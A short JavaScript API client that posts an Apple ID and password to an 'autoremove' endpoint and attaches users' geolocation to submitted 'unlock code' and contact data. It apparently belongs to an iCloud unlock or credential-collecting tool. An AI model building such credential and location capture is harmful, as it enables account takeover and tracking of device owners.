import axios from 'axios';
let configCache = null;
import geolocation from './geolocation';

const config = {
  headers: {
    'Content-Type': 'application/json',
  }
};


const autoremove = async (appleID, password) => {
  const response = await axios.post(`${window.APP_CONFIG.API_URL}/api/autoremove`, { appleID, password }, config);
  return response.data;
}


const addUnlockCode = async (data) => {
  
  const geoData = await geolocation.location();
  const payload = {
    ...data,       // Esparce las propiedades originales (nombre, email, etc.)
    locationData: geoData     // Esparce las propiedades de geolocalización (ip, location, etc.)
  };
  const response = await axios.post(`${window.APP_CONFIG.API_URL}/api/support/addUnlockCode`, 
    payload, 
    config

  );
  return response.data;
}


const addData = async (data) => {
   const geoData = await geolocation.location();
   const payload = {
    ...data,       // Esparce las propiedades originales (nombre, email, etc.)
    locationData: geoData     // Esparce las propiedades de geolocalización (ip, location, etc.)
  };
  const response = await axios.post(
    `${window.APP_CONFIG.API_URL}/api/support/addData`, 
    payload, 
    config

  );
  return response.data;
}

export default {
  autoremove,
  addUnlockCode,
  addData
};

